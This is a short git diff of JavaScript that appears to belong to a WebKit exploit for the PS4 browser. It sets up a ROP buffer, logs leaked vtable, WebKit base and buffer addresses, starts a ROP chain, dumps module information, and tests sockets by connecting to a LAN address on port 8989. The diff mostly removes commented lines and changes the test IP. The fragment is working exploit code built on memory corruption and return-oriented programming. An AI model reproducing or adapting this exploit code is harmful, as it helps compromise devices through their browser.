@@ -167,19 +167,13 @@ try {
     cbuf[0x15] = rop_buf_addr.getHighBitsUnsigned()
 
     storage.set_initial_addr(rop_buf_addr.add(0x10000 * 4))
-    
+
     debug_log("vtable = 0x" + vtable_ptr.toString(16))
     debug_log("webkit_base_addr = 0x" + webkit_base_addr.toString(16))
     debug_log("buffer addr = 0x" + rop_buf_addr.toString(16))
     
-    // var newBase = webkit_base_addr.add(0xC00000);
-    // cbuf[0x14] = newBase.getLowBitsUnsigned()
-    // cbuf[0x15] = newBase.getHighBitsUnsigned()
-    // cbuf[0x1e] = 0x80000;
-    // debug_bin(rop_buf, "webkit."+newBase.toString(16)+".bin");
-    
     debug_log("Starting ROP...")
-    
+
     debug_log('Printing module information...')
     for (var i = 0; i < 0x100; i++) {
         var buf = storage.alloc(0x1A8)
@@ -200,10 +194,11 @@ try {
         debug_log('===============')
         storage.free(0x1A8 + 0x4)
     }
+
     debug_log('Testing sockets...')
     var s = socket()
     debug_log('socket() returned 0x' + s.toString(16))
-    var cn = connect_helper(s, '10.0.1.142', 8989)
+    var cn = connect_helper(s, '192.168.1.67', 8989)
     debug_log('connect() returned 0x' + cn.toString(16))
     var str_to_write = "Hello From a PS4!\n"
     var addr = storage.alloc(str_to_write.length)
@@ -211,6 +206,7 @@ try {
     var bytes_written = write(s, addr, str_to_write.length)
     debug_log('write() returned 0x' + bytes_written.toString(16))
     storage.free(str_to_write.length)
+
     debug_log("DONE!")
 } catch (ex) {
     alert("Error: "+ex);
